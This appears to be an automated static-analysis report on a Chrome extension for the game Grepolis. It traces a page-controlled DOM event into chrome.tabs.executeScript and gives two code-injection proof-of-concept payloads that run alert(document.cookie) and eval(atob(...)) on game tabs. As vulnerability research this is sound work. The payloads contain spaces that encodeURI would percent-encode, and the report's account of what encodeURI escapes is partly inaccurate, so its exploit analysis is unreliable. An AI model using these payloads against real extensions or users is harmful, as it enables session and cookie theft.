# CoCo Analysis: fehekolnlpmcpflkgchknkboeanmhicc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink: document_eventListener_gtkAskAddonShowInGame → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fehekolnlpmcpflkgchknkboeanmhicc/opgen_generated_files/cs_1.js
Line 467    document.addEventListener('gtkAskAddonShowInGame', function(event) {
Line 468    chrome.runtime.sendMessage({data: event.detail}, function(response) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fehekolnlpmcpflkgchknkboeanmhicc/opgen_generated_files/bg.js
Line 969    chrome.tabs.executeScript(tabs[0].id, {code: "window.postMessage({ type: 'gtkShowInGame', coordX: " + encodeURI(data.coordX) + ", coordY: " + encodeURI(data.coordY) + " }, '*');"});

**Code:**

```javascript
// Content script (cs_1.js/map_connector.js) - Entry point
document.addEventListener('gtkAskAddonShowInGame', function(event) {
    // ← Attacker-controlled: any webpage can dispatch this event
    chrome.runtime.sendMessage({data: event.detail}, function(response) {
        // event.detail ← attacker-controlled data
        if (!response.success) {
            alert(response.message);
        }
    });
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    var data = request.data;  // ← attacker-controlled from event.detail
    chrome.tabs.query({url: 'https://' + data.worldNum + '.grepolis.com/*'}, function(tabs) {
        if (tabs.length > 0) {
            // Arbitrary code execution: attacker controls coordX and coordY
            chrome.tabs.executeScript(tabs[0].id, {
                code: "window.postMessage({ type: 'gtkShowInGame', coordX: " + encodeURI(data.coordX) + ", coordY: " + encodeURI(data.coordY) + " }, '*');"
                // ← attacker-controlled data.coordX and data.coordY injected into code string
            });
            sendResponse({success: true, doesUpdateTab: data.doesUpdateTab});
            chrome.tabs.update(tabs[0].id, {highlighted: true});
        } else {
            sendResponse({success: false, message: 'Le jeu n\'est pas ouvert'});
        }
    });
    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener

**Attack:**

```javascript
// Malicious webpage on https://grepolistoolkit.com/* (where cs_1.js is injected)
// can dispatch a custom event with malicious payload

// Exploit 1: Code injection via coordX
var maliciousEvent = new CustomEvent('gtkAskAddonShowInGame', {
    detail: {
        worldNum: 'en',
        coordX: '0, coordY: 0 }); alert(document.cookie); void({ coordX: 0',
        coordY: '0',
        doesUpdateTab: false
    }
});
document.dispatchEvent(maliciousEvent);

// Exploit 2: More sophisticated attack to execute arbitrary code
var attackEvent = new CustomEvent('gtkAskAddonShowInGame', {
    detail: {
        worldNum: 'en',
        coordX: '0 }); eval(atob("' + btoa("malicious_code_here") + '")); void({ x: 0',
        coordY: '0',
        doesUpdateTab: false
    }
});
document.dispatchEvent(attackEvent);

// The executeScript will inject:
// window.postMessage({ type: 'gtkShowInGame', coordX: 0 }); eval(atob("...")); void({ x: 0, coordY: 0 }, '*');
```

**Impact:** Arbitrary JavaScript code execution in the context of Grepolis game pages (*.grepolis.com). An attacker hosting a malicious page on the whitelisted grepolistoolkit.com domain (or compromising it) can execute arbitrary JavaScript code on any open Grepolis game tab. While `encodeURI()` provides some encoding, it is insufficient to prevent code injection because it doesn't escape quotes, semicolons, or other JavaScript syntax characters. The attacker can break out of the string context and inject arbitrary JavaScript code that will be executed via chrome.tabs.executeScript with elevated extension privileges on the Grepolis domain, allowing theft of game session data, cookies, and manipulation of game state.
